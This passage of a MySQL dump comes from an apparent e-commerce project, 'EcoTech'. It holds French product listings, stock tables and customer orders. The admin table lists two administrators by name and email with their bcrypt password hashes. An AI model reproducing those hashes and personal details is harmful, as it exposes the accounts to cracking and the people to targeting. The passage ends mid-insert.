(160, 'AR202506040079', 'ASUS ROG Strix Scope II X', 'Clavier gaming - interrupteurs mécaniques ROG NX Snow v2 - Repose-poignets', 159.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/26/00/LD0006260071.jpg'),
(161, 'AR202406100025', 'ASUS TUF Gaming K3 Gen II', 'Clavier gaming compact - opto-mécanique RGB - Aura Sync', 79.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/15/42/LD0006154263.jpg'),
(162, 'AR202505120002', 'ASUS TUF K3 Hatsune Miku', 'Clavier gaming compact - Edition Hatsune Miku - Opto-mécanique', 99.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/24/68/LD0006246869.jpg'),
(163, 'AR202301090200', 'ASUS ROG Falchion Ace Blanc', 'Clavier gaming filaire 65% - mécanique ROG NX Red - Blanc', 124.90, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/06/00/71/LD0006007128.jpg'),
(164, 'AR202202280121', 'ASUS ROG Strix Flare II Animate', 'Clavier gaming filaire - écran LED AniMe Matrix - ROG NX Red', 219.00, 'Périphériques', 'https://media.ldlc.com/r150/ld/products/00/05/93/88/LD0005938808_1.jpg'),
(165, 'AR201803290201', 'AKG K240 MKII', 'Casque circum-aural semi-ouvert Hi-Fi / Monitoring avec diaphragme double couche', 89.90, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/86/06/LD0004860670_2.jpg'),
(166, 'AR201803290202', 'AKG K240 Studio', 'Casque circum-aural semi-ouvert Hi-Fi / Mixage avec diaphragme double couche', 75.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/86/05/LD0004860528_2.jpg'),
(167, 'AR202001130052', 'AKG K361-BT', 'Casque circum-aural fermé sans fil - Hi-Fi / Monitoring / Streaming - Bluetooth 5.0', 129.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/05/57/07/LD0005570745_2.jpg'),
(168, 'AR201803290205', 'AKG K52', 'Casque circum-aural fermé Hi-Fi / Monitoring', 39.90, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/85/12/LD0004851268_2.jpg'),
(169, 'AR201803300010', 'AKG K712 PRO', 'Casque circum-aural ouvert Hi-Fi / Monitoring avec bobinage à plat', 249.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/85/99/LD0004859932_2.jpg'),
(170, 'AR202409100108', 'Apple AirPods 4', 'Écouteurs intra-auriculaires True Wireless - Bluetooth - Autonomie 5 + 25 h', 149.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/16/66/LD0006166698.jpg'),
(171, 'AR202409100111', 'Apple AirPods Max Minuit', 'Casque circum-aural fermé sans fil - Réduction de bruit active - Bluetooth 5.0', 579.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/16/68/LD0006166837.jpg'),
(172, 'AR202309130355', 'Apple AirPods Pro 2 (USB-C)', 'Réduction active du bruit et mode Transparence - Audio adaptatif - Bluetooth 5.3', 279.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/06/66/LD0006066681.jpg'),
(173, 'MK241113528912', 'Avizar Conduction Osseuse', 'Transmission fluide et sans interférence - Bluetooth 5.2 - Modèle Stan Noir', 45.00, 'Audio', 'https://media.ldlc.com/r150/mktp/product/productImage/241113/105/671a678b566f48de8709742d6ba2850f.webp'),
(174, 'MK250610604716', 'Avizar Portland Noir', 'Casque Stéréo Bluetooth 5.3 Portland avec Micro Jack 3.5mm - 12h autonomie', 29.90, 'Audio', 'https://media.ldlc.com/r150/mktp/product/productImage/250610/120/5b318e991a84452c9b0f5856eef0f5ae.webp'),
(175, NULL, '', NULL, NULL, 'périphérique', NULL);

-- --------------------------------------------------------

--
-- Structure de la table `ecotechstock`
--

DROP TABLE IF EXISTS `ecotechstock`;
CREATE TABLE IF NOT EXISTS `ecotechstock` (
  `id_stock` int NOT NULL AUTO_INCREMENT,
  `id_produit` int DEFAULT NULL,
  `quantite` int DEFAULT '0',
  PRIMARY KEY (`id_stock`),
  UNIQUE KEY `id_produit` (`id_produit`)
) ENGINE=MyISAM AUTO_INCREMENT=90 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechstock`
--

INSERT INTO `ecotechstock` (`id_stock`, `id_produit`, `quantite`) VALUES
(12, 74, 28),
(11, 73, 44),
(10, 72, 48),
(9, 71, 19),
(8, 70, 14),
(7, 69, 15),
(13, 75, 46),
(14, 76, 6),
(15, 77, 25),
(16, 78, 12),
(17, 79, 20),
(18, 80, 46),
(19, 81, 10),
(20, 82, 41),
(21, 83, 38),
(22, 84, 19),
(23, 85, 19),
(24, 86, 34),
(25, 87, 18),
(26, 88, 28),
(27, 89, 37),
(28, 90, 7),
(29, 91, 8),
(30, 92, 14),
(31, 93, 44),
(32, 94, 35),
(33, 95, 41),
(34, 96, 7),
(35, 97, 40),
(36, 98, 42),
(37, 99, 38),
(38, 100, 15),
(39, 101, 46),
(40, 102, 46),
(41, 103, 44),
(42, 104, 31),
(43, 105, 21),
(44, 106, 49),
(45, 107, 45),
(46, 108, 26),
(47, 109, 37),
(48, 110, 12),
(49, 111, 33),
(50, 112, 37),
(51, 113, 37),
(52, 114, 21),
(53, 115, 39),
(54, 116, 25),
(55, 117, 9),
(56, 118, 19),
(57, 119, 11),
(58, 120, 21),
(59, 121, 5),
(60, 122, 19),
(61, 123, 14),
(62, 124, 9),
(63, 125, 29),
(64, 126, 26),
(65, 127, 13),
(66, 128, 9),
(67, 129, 30),
(68, 130, 30),
(69, 131, 26),
(70, 132, 6),
(71, 133, 6),
(72, 134, 8),
(73, 135, 17),
(74, 136, 26),
(75, 137, 15),
(76, 138, 21),
(77, 139, 25),
(78, 140, 27),
(79, 141, 29),
(80, 142, 26),
(81, 143, 12),
(82, 144, 34),
(83, 145, 11),
(84, 146, 9),
(85, 147, 5),
(86, 148, 25),
(87, 149, 17),
(88, 150, 33),
(89, 151, 20);

-- --------------------------------------------------------

--
-- Structure de la table `ecotechstock_periphs`
--

DROP TABLE IF EXISTS `ecotechstock_periphs`;
CREATE TABLE IF NOT EXISTS `ecotechstock_periphs` (
  `id_stock` int NOT NULL AUTO_INCREMENT,
  `id_produit` int DEFAULT NULL,
  `quantite` int DEFAULT '0',
  PRIMARY KEY (`id_stock`),
  UNIQUE KEY `id_produit` (`id_produit`)
) ENGINE=MyISAM AUTO_INCREMENT=103 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechstock_periphs`
--

INSERT INTO `ecotechstock_periphs` (`id_stock`, `id_produit`, `quantite`) VALUES
(55, 117, 27),
(56, 118, 1),
(57, 119, 44),
(58, 120, 41),
(59, 121, 13),
(60, 122, 33),
(61, 123, 16),
(62, 124, 20),
(63, 125, 44),
(64, 126, 50),
(65, 127, 57),
(66, 128, 25),
(67, 129, 47),
(68, 130, 10),
(69, 131, 48),
(70, 132, 31),
(71, 133, 51),
(72, 134, 51),
(73, 135, 44),
(74, 136, 56),
(75, 137, 41),
(76, 138, 25),
(77, 139, 44),
(78, 140, 34),
(79, 141, 27),
(80, 142, 26),
(81, 143, 40),
(82, 144, 10),
(83, 145, 20),
(84, 146, 11),
(85, 147, 36),
(86, 148, 40),
(87, 149, 29),
(88, 150, 15),
(89, 151, 30),
(90, 152, 47),
(91, 153, 33),
(92, 154, 13),
(93, 155, 10),
(94, 156, 49),
(95, 157, 56),
(96, 158, 25),
(97, 159, 45),
(98, 160, 43),
(99, 161, 21),
(100, 162, 14),
(101, 163, 49),
(102, 164, 41);

-- --------------------------------------------------------

--
-- Structure de la table `ecotechstock_sons`
--

DROP TABLE IF EXISTS `ecotechstock_sons`;
CREATE TABLE IF NOT EXISTS `ecotechstock_sons` (
  `id_stock` int NOT NULL AUTO_INCREMENT,
  `id_produit` int DEFAULT NULL,
  `quantite` int DEFAULT '0',
  PRIMARY KEY (`id_stock`),
  UNIQUE KEY `id_produit` (`id_produit`)
) ENGINE=MyISAM AUTO_INCREMENT=65 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechstock_sons`
--

INSERT INTO `ecotechstock_sons` (`id_stock`, `id_produit`, `quantite`) VALUES
(55, 125, 0),
(56, 126, 1),
(57, 127, 30),
(58, 128, 5),
(59, 129, 0),
(60, 130, 50),
(61, 131, 12),
(62, 132, 8),
(63, 133, 20),
(64, 134, 45);

-- --------------------------------------------------------

--
-- Structure de la table `ecotechstock_tel`
--

DROP TABLE IF EXISTS `ecotechstock_tel`;
CREATE TABLE IF NOT EXISTS `ecotechstock_tel` (
  `id_stock` int NOT NULL AUTO_INCREMENT,
  `id_produit` int DEFAULT NULL,
  `quantite` int DEFAULT '0',
  PRIMARY KEY (`id_stock`),
  UNIQUE KEY `id_produit` (`id_produit`)
) ENGINE=MyISAM AUTO_INCREMENT=90 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechstock_tel`
--

INSERT INTO `ecotechstock_tel` (`id_stock`, `id_produit`, `quantite`) VALUES
(55, 117, 15),
(56, 118, 9),
(57, 119, 21),
(58, 120, 13),
(59, 121, 29),
(60, 122, 9),
(61, 123, 15),
(62, 124, 13),
(63, 125, 16),
(64, 126, 8),
(65, 127, 14),
(66, 128, 15),
(67, 129, 26),
(68, 130, 23),
(69, 131, 32),
(70, 132, 28),
(71, 133, 7),
(72, 134, 8),
(73, 135, 14),
(74, 136, 12),
(75, 137, 12),
(76, 138, 20),
(77, 139, 29),
(78, 140, 21),
(79, 141, 17),
(80, 142, 16),
(81, 143, 24),
(82, 144, 6),
(83, 145, 16),
(84, 146, 26),
(85, 147, 17),
(86, 148, 32),
(87, 149, 16),
(88, 150, 8),
(89, 151, 19);

-- --------------------------------------------------------

--
-- Structure de la table `ecotechstock_tv`
--

DROP TABLE IF EXISTS `ecotechstock_tv`;
CREATE TABLE IF NOT EXISTS `ecotechstock_tv` (
  `id_stock` int NOT NULL AUTO_INCREMENT,
  `id_produit` int DEFAULT NULL,
  `quantite` int DEFAULT '0',
  PRIMARY KEY (`id_stock`),
  UNIQUE KEY `id_produit` (`id_produit`)
) ENGINE=MyISAM AUTO_INCREMENT=103 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotechstock_tv`
--

INSERT INTO `ecotechstock_tv` (`id_stock`, `id_produit`, `quantite`) VALUES
(55, 117, 53),
(56, 118, 19),
(57, 119, 27),
(58, 120, 19),
(59, 121, 52),
(60, 122, 43),
(61, 123, 51),
(62, 124, 17),
(63, 125, 20),
(64, 126, 41),
(65, 127, 37),
(66, 128, 53),
(67, 129, 41),
(68, 130, 40),
(69, 131, 15),
(70, 132, 48),
(71, 133, 36),
(72, 134, 24),
(73, 135, 55),
(74, 136, 44),
(75, 137, 44),
(76, 138, 27),
(77, 139, 45),
(78, 140, 35),
(79, 141, 32),
(80, 142, 43),
(81, 143, 59),
(82, 144, 57),
(83, 145, 51),
(84, 146, 22),
(85, 147, 46),
(86, 148, 56),
(87, 149, 33),
(88, 150, 38),
(89, 151, 32),
(90, 152, 36),
(91, 153, 24),
(92, 154, 52),
(93, 155, 29),
(94, 156, 30),
(95, 157, 51),
(96, 158, 59),
(97, 159, 29),
(98, 160, 10),
(99, 161, 53),
(100, 162, 24),
(101, 163, 53),
(102, 164, 33);

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_admins`
--

DROP TABLE IF EXISTS `ecotech_admins`;
CREATE TABLE IF NOT EXISTS `ecotech_admins` (
  `id_admin` int NOT NULL AUTO_INCREMENT,
  `nom` varchar(50) NOT NULL,
  `prenom` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `role` varchar(20) DEFAULT 'super_admin',
  `last_login` datetime DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `photo` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id_admin`),
  UNIQUE KEY `email` (`email`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_admins`
--

INSERT INTO `ecotech_admins` (`id_admin`, `nom`, `prenom`, `email`, `password_hash`, `role`, `last_login`, `created_at`, `photo`) VALUES
(1, 'Ezechiel', 'KOUAKOU', 'ezechiel.kouakou@adminecotech.fr', '$2y$10$DydpTu3oy9gQN8v3LWcLfuT7XKbPiWTTH5sHhbJZIVXoFGTM2kV.2', 'super admin', NULL, '2026-03-29 08:16:01', '/ecotechnologie/ecotechadmin/ecotechadmin-pictures/ezechiel-photo'),
(2, 'Amadou', 'FIRDAOUS', 'amadou.firdaous@adminecotech.fr', '$2y$10$opjoDCKYq9K0RwKNYFevZe1Qd6kgD9FxI.WyLF3fe7QYVBNvFNfum', 'super admin', NULL, '2026-03-29 08:30:48', '/ecotechnologie/ecotechadmin/ecotechadmin-pictures/amadou-photo');

-- --------------------------------------------------------

--
-- Structure de la table `ecotech_commandes`
--

DROP TABLE IF EXISTS `ecotech_commandes`;
CREATE TABLE IF NOT EXISTS `ecotech_commandes` (
  `id` int NOT NULL AUTO_INCREMENT,
  `id_client` int NOT NULL,
  `session_commande` varchar(100) DEFAULT NULL,
  `details_json` text NOT NULL,
  `montant_total` decimal(10,2) NOT NULL,
  `statut` enum('attente','paye','annule') DEFAULT 'attente',
  `date_creation` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `session_commande` (`session_commande`)
) ENGINE=MyISAM AUTO_INCREMENT=93 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `ecotech_commandes`
--

INSERT INTO `ecotech_commandes` (`id`, `id_client`, `session_commande`, `details_json`, `montant_total`, `statut`, `date_creation`) VALUES
(1, 91, 'ECO-FA9EX0GQI', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"2\",\"pu\":\"29.9\"}]', 59.80, 'attente', '2026-03-19 12:57:50'),
(2, 91, 'ECO-1KVTBBK6J', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"2\",\"pu\":\"29.9\"}]', 59.80, 'attente', '2026-03-19 13:04:56'),
(3, 91, 'ECO-0E8IT7I6V', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-19 13:10:27'),
(4, 91, 'ECO-KRERB3YNQ', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-19 13:16:54'),
(5, 91, 'ECO-XJZE2H6VJ', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-19 15:03:54'),
(6, 91, 'ECO-SC7PG5PWP', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-19 15:06:15'),
(7, 90, 'ECO-OO74GCTG0', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'attente', '2026-03-19 15:12:57'),
(8, 92, 'ECO-34S7KW65M', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-19 15:21:15'),
(9, 92, 'ECO-OFVLZ1G4M', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 15:22:14'),
(10, 92, 'ECO-VVMS7YSHD', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"},{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"},{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 1445.85, 'paye', '2026-03-19 15:24:27'),
(11, 92, 'ECO-CPRRNUAEY', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"},{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"},{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 1445.85, 'paye', '2026-03-19 15:33:12'),
(12, 92, 'ECO-HK658CFCW', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"},{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"},{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"},{\"nom\":\"Hisense 40A4Q\",\"qty\":\"1\",\"pu\":\"269.1\"}]', 1714.95, 'paye', '2026-03-19 15:40:17'),
(13, 93, 'ECO-3SX81GW7O', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 18:15:04'),
(14, 68, 'ECO-JSB3BKA79', '[{\"nom\":\"ASUS ExpertBook B1 B1503CVA-S71360X\",\"qty\":\"1\",\"pu\":\"923.12\"}]', 923.12, 'attente', '2026-03-19 18:16:28'),
(15, 93, 'ECO-RD15Q9732', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 18:18:07'),
(16, 93, 'ECO-9RJC1YYPX', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 18:19:52'),
(17, 93, 'ECO-PS06R0N5S', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 18:21:46'),
(18, 93, 'ECO-R5QQEMT93', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-19 18:26:02'),
(19, 93, 'ECO-H0UB7COL8', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-19 18:37:13'),
(20, 90, 'ECO-GIQXU2Q3J', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"3\",\"pu\":\"45\"}]', 135.00, 'paye', '2026-03-19 21:16:33'),
(21, 93, 'ECO-KOGA7HDN2', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-20 16:45:11'),
(22, 93, 'ECO-5ZMKMG92T', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-20 17:27:39'),
(23, 93, 'ECO-DOZA97RAC', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'attente', '2026-03-21 07:00:47'),
(24, 94, 'ECO-ZOLHQ2K9P', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-21 07:00:49'),
(26, 90, 'ECO-5UEH6NFTB', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-21 19:24:18'),
(27, 90, 'ECO-GAV1JJB9C', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-21 19:41:49'),
(28, 90, 'ECO-9VNYRSB4Q', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-21 19:42:36'),
(29, 90, 'ECO-E90QFA0UJ', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-21 19:45:27'),
(30, 93, 'ECO-RPQIL5TCN', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-21 20:00:52'),
(31, 93, 'ECO-NCJ2RGCAM', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-21 20:23:31'),
(32, 93, 'ECO-Z423I7O0N', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-21 20:46:27'),
(33, 93, 'ECO-LOF73CI5U', '[{\"nom\":\"Apple iPhone 16 Plus 512 Go Blanc\",\"qty\":\"1\",\"pu\":\"1369\"}]', 1369.00, 'attente', '2026-03-22 12:00:16'),
(34, 92, 'ECO-WIWKJSARW', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"},{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 74.90, 'paye', '2026-03-22 13:00:25'),
(35, 93, 'ECO-BB1CJVADO', '[{\"nom\":\"Apple iPhone 16 Plus 512 Go Blanc\",\"qty\":\"1\",\"pu\":\"1369\"}]', 1369.00, 'attente', '2026-03-22 15:37:59'),
(36, 93, 'ECO-O6H2QN7G1', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-22 15:38:26'),
(37, 93, 'ECO-1CY4ILVD8', '[{\"nom\":\"Apple iPhone 16e 512 Go Noir\",\"qty\":\"1\",\"pu\":\"891.65\"},{\"nom\":\"Apple iPhone 15 512 Go Vert\",\"qty\":\"1\",\"pu\":\"1099\"},{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"2\",\"pu\":\"696.75\"}]', 3384.15, 'attente', '2026-03-22 15:47:23'),
(38, 93, 'ECO-RUJWZK3C7', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 45.00, 'paye', '2026-03-22 15:51:06'),
(39, 93, 'ECO-JR6QB54CV', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"},{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"1\",\"pu\":\"45\"}]', 74.90, 'paye', '2026-03-22 15:53:38'),
(40, 93, 'ECO-0G201V725', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"2\",\"pu\":\"29.9\"}]', 59.80, 'paye', '2026-03-22 16:01:21'),
(41, 68, 'ECO-JOG4HEZWJ', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-23 12:57:08'),
(42, 53, 'ECO-DU2LY5COY', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 12:59:04'),
(43, 93, 'ECO-G41ROD0PW', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-23 20:25:48'),
(44, 93, 'ECO-9VJC44WLZ', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 21:32:39'),
(45, 93, 'ECO-SS6E7OM82', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 21:50:23'),
(46, 93, 'ECO-KW298EVUL', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 21:56:19'),
(47, 93, 'ECO-1L6DC9ZAD', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-23 22:16:55'),
(48, 95, 'ECO-XC1ES6GG6', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 22:19:31'),
(49, 95, 'ECO-RUGR34J86', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 22:25:41'),
(50, 95, 'ECO-8D2JHERRF', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-23 22:30:21'),
(51, 95, 'ECO-HKSE435U3', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-23 22:39:17'),
(52, 95, 'ECO-2FWU4369H', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"2\",\"pu\":\"45\"}]', 90.00, 'paye', '2026-03-23 22:41:12'),
(53, 93, 'ECO-4OISAUKZ9', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'attente', '2026-03-24 12:08:15'),
(54, 97, 'ECO-2K6V48Q7P', '[{\"nom\":\"Apple iPhone 17 512 Go Brume\",\"qty\":\"1\",\"pu\":\"1262.55\"}]', 1262.55, 'paye', '2026-03-25 12:31:00'),
(55, 93, 'ECO-YW44V9VXA', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-26 17:53:35'),
(56, 93, 'ECO-BUPVKOCGI', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-26 17:54:28'),
(57, 93, 'ECO-1HAMMU1SD', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'attente', '2026-03-26 17:56:02'),
(58, 99, 'ECO-24RMTZPJS', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-26 17:58:41'),
(59, 99, 'ECO-19VG15ERT', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-26 18:04:53'),
(60, 101, 'ECO-HA6A5Y8LK', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"}]', 29.90, 'paye', '2026-03-26 18:08:18'),
(61, 94, 'ECO-BJ29TL5P5', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"1\",\"pu\":\"29.9\"},{\"nom\":\"Apple iPhone 16 128 Go Rose\",\"qty\":\"1\",\"pu\":\"872.1\"}]', 902.00, 'paye', '2026-03-26 22:07:24'),
(62, 93, 'ECO-PYZVQUMZR', '[{\"nom\":\"Avizar Portland Noir\",\"qty\":\"4\",\"pu\":\"29.9\"},{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"2\",\"pu\":\"45\"}]', 209.60, 'attente', '2026-03-28 07:38:52'),
(63, 99, 'ECO-PZK8G2CBY', '[{\"nom\":\"Hisense 40A4Q\",\"qty\":\"1\",\"pu\":\"269.1\"}]', 269.10, 'paye', '2026-03-29 13:01:39'),
(64, 99, 'ECO-YCNUS1V02', '[{\"nom\":\"Avizar Conduction Osseuse\",\"qty\":\"3\",\"pu\":\"45\"}]', 135.00, 'paye', '2026-03-29 13:02:43'),
(65, 98, 'ECO-V0C2UVM7F', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-30 19:17:48'),
(66, 98, 'ECO-6XV1E9WFC', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-30 19:19:22'),
(67, 98, 'ECO-I650PWZYU', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-30 19:21:52'),
(68, 98, 'ECO-43UCZ4JUX', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-30 19:24:10'),
(69, 98, 'ECO-5AM4YQJ3U', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:25:57'),
(70, 98, 'ECO-NSHBZMA3G', '[{\"nom\":\"Apple iPhone 14 512 Go (PRODUCT)RED\",\"qty\":\"1\",\"pu\":\"696.75\"}]', 696.75, 'paye', '2026-03-30 19:29:41'),
(71, 98, 'ECO-NTY7B951J', '[{\"nom\":\"ASUS ExpertBook BM1 BM1503CDA-S70310X\",\"qty\":\"1\",\"pu\":\"719.2\"}]', 719.20, 'paye', '2026-03-30 19:30:05'),
